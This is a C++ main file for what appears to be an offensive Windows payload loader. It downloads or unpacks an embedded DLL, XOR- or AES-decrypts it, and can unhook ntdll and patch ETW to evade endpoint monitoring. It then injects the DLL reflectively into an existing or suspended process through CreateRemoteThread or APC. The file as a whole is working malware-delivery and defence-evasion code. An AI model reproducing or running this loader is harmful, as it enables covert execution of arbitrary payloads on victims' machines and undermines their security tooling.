// main.cpp
#include <windows.h>
#include <string>
#include <vector>
#include <iostream>

#include "http.h"
#include "crypto.h"
#include "etw.h"
#include "ntdll.h"
#include "remote.h"
#include "injector.h"

// Forward decl for embedded buffer
extern unsigned char dll_buf[];
extern size_t dll_buf_len;

int main(int argc, char* argv[]) {
    std::vector<BYTE> payload;
    std::string xorKey, aesKey, aesIV;
    std::string url, targetProcAnsi, spawnProcAnsi;
    std::wstring targetProcW, spawnProcW;
    DWORD execMethod = EXEC_METHOD::CreateRemoteThreadExec;
    bool useEmbed = false, unhook = false, patchETW = false;

    // Parse args (basic manual parsing)
    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];

        if (arg == "--embed") useEmbed = true;
        else if (arg == "--uri") url = argv[++i];
        else if (arg == "--xor") xorKey = argv[++i];
        else if (arg == "--aes") aesKey = argv[++i];
        else if (arg == "--iv") aesIV = argv[++i];
        else if (arg == "--target") targetProcAnsi = argv[++i];
        else if (arg == "--spawn") spawnProcAnsi = argv[++i];
        else if (arg == "--exec") {
            std::string mode = argv[++i];
            if (mode == "crt") execMethod = EXEC_METHOD::CreateRemoteThreadExec;
            else if (mode == "apc") execMethod = EXEC_METHOD::ApcExec;
        }
        else if (arg == "--unhook") unhook = true;
        else if (arg == "--patch-etw") patchETW = true;
    }

    if (!targetProcAnsi.empty()) {
        targetProcW.assign(targetProcAnsi.begin(), targetProcAnsi.end());
    }

    if (!spawnProcAnsi.empty()) {
        spawnProcW.assign(spawnProcAnsi.begin(), spawnProcAnsi.end());
    }

    // Load DLL buffer
    if (useEmbed) {
        payload.assign(dll_buf, dll_buf + dll_buf_len);
        std::cout << "[+] Using embedded DLL.\n";
    }
    else if (!url.empty()) {
        if (!DownloadRemotePayload(url, payload)) {
            std::cerr << "[-] Download failed.\n";
            return 1;
        }
        std::cout << "[+] DLL downloaded: " << payload.size() << " bytes.\n";
    } else {
        std::cerr << "[-] No payload source provided.\n";
        return 1;
    }

    // Decode/decrypt
    if (!xorKey.empty()) {
        XORDecode(payload, xorKey);
        std::cout << "[*] XOR decoding applied.\n";
    }

    if (!aesKey.empty() && !aesIV.empty()) {
        if (!AESDecrypt(payload, aesKey, aesIV)) {
            std::cerr << "[-] AES decryption failed.\n";
            return 1;
        }
        std::cout << "[*] AES decryption complete.\n";
    }

    // Unhook + ETW Patch (optional)
    if (unhook) UnhookNtdll();
    if (patchETW) PatchETW();

    // Target process
    HANDLE hProc = nullptr;
    PROCESS_INFORMATION pi = { 0 };

    if (!targetProcW.empty()) {
        hProc = OpenTargetProcess(targetProcW);
    }
    else if (!spawnProcW.empty()) {
        hProc = SpawnSuspendedProcess(spawnProcW, pi);
    }

    if (!hProc) {
        std::cerr << "[-] Failed to open or spawn target process.\n";
        return 1;
    }

    // Inject
    if (!InjectReflectiveDLL(hProc, payload.data(), payload.size(), execMethod)) {
        std::cerr << "[-] Injection failed.\n";
        return 1;
    }

    // Resume process if needed
    if (pi.hThread) {
        ResumeThread(pi.hThread);
        CloseHandle(pi.hThread);
    }

    CloseHandle(hProc);
    return 0;
}
